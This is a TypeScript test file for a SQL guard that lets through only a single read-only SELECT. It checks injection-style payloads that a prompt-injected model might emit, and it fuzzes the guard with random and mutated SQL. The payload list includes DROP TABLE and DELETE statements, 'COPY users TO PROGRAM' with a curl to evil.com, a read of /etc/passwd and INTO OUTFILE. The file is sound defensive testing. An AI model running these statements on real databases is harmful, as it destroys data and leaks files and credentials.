/**
 * Prompt-injection + fuzz - the two checks a production
 * security review scrutinizes hardest.
 *
 * Prompt injection: whatever a model emits after a malicious schema comment, the guard
 *   is the authority - no non-SELECT ever reports "allowed".
 * Property-based fuzz over random + mutated SQL. Two invariants must
 *   hold for EVERY input: (1) never throws, (2) never marks a write/DDL form
 *   as allowed. A verdict of allowed must be a genuine single SELECT.
 */
import { describe, expect, it } from 'vitest';
import fc from 'fast-check';
import pkg from 'node-sql-parser';
import { guardSql } from '../src/guard.js';
import { POSTGRES_DIALECT, MYSQL_DIALECT, SQLITE_DIALECT } from '../src/dialects.js';

const { Parser } = pkg;
const parser = new Parser();
const DIALECTS = [POSTGRES_DIALECT, MYSQL_DIALECT, SQLITE_DIALECT];

describe('prompt-injection payloads never yield an allowed write', () => {
  // Payloads a compromised/confused model might emit if it "obeyed" an
  // injected instruction hidden in a table/column comment.
  const injected = [
    'DROP TABLE users; --',
    'SELECT 1; DROP TABLE users',
    'DELETE FROM users WHERE 1=1',
    "'; DROP TABLE users; --",
    'SELECT * FROM users; UPDATE users SET admin=true',
    'WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x',
    'GRANT ALL ON users TO PUBLIC',
    "COPY users TO PROGRAM 'curl evil.com'",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT * FROM users INTO OUTFILE '/tmp/x'",
  ];
  for (const sql of injected) {
    it(`blocks: ${sql.slice(0, 48)}`, () => {
      for (const dialect of DIALECTS) {
        const v = guardSql({ sql, dialect });
        expect(v.allowed).toBe(false);
      }
    });
  }
});

/** True if the (already parseable) SQL is a genuine single read-only SELECT. */
function isTrueSelect(sql: string, grammar: string): boolean {
  try {
    const ast = parser.astify(sql, { database: grammar });
    const stmts = Array.isArray(ast) ? ast : [ast];
    if (stmts.length !== 1) return false;
    const t = (stmts[0] as { type?: string }).type;
    return t === 'select';
  } catch {
    return false;
  }
}

describe('fuzz: guard never throws, never allows a write', () => {
  it('random strings', () => {
    fc.assert(
      fc.property(fc.string({ maxLength: 200 }), fc.constantFrom(...DIALECTS), (sql, dialect) => {
        const v = guardSql({ sql, dialect }); // must not throw
        if (v.allowed) {
          // If allowed, the emitted SQL must be a real single SELECT.
          expect(isTrueSelect(v.sql, dialect.grammar)).toBe(true);
        }
      }),
      { numRuns: 2000 },
    );
  });

  it('SQL-shaped mutations (keywords + punctuation + literals)', () => {
    const token = fc.constantFrom(
      'SELECT',
      'select',
      'FROM',
      'WHERE',
      'users',
      'orders',
      '*',
      ',',
      ';',
      '(',
      ')',
      'DROP',
      'DELETE',
      'INSERT',
      'UPDATE',
      'TABLE',
      'INTO',
      'VALUES',
      '1',
      '=',
      "'x'",
      'UNION',
      'ALL',
      'JOIN',
      'ON',
      '--',
      '/*',
      '*/',
      'pg_sleep(1)',
      'LIMIT',
      '100',
      'WITH',
      'AS',
      'RETURNING',
      'OUTFILE',
      'FOR',
      'UPDATE',
      'GRANT',
      'COPY',
    );
    fc.assert(
      fc.property(fc.array(token, { minLength: 1, maxLength: 30 }), fc.constantFrom(...DIALECTS), (toks, dialect) => {
        const sql = toks.join(' ');
        const v = guardSql({ sql, dialect });
        if (v.allowed) {
          expect(isTrueSelect(v.sql, dialect.grammar)).toBe(true);
        }
      }),
      { numRuns: 3000 },
    );
  });

  it('mutations of a valid SELECT (byte edits)', () => {
    const base = 'SELECT id, name FROM users WHERE created_at > now() LIMIT 10';
    const oneChar = fc.constantFrom(...`abcXYZ012 ()=;,'"*-/.\t\n%#`.split(''));
    fc.assert(
      fc.property(fc.nat({ max: base.length - 1 }), oneChar, (pos, ch) => {
        const mutated = base.slice(0, pos) + ch + base.slice(pos + 1);
        const v = guardSql({ sql: mutated, dialect: POSTGRES_DIALECT });
        if (v.allowed) expect(isTrueSelect(v.sql, 'Postgresql')).toBe(true);
      }),
      { numRuns: 2000 },
    );
  });
});
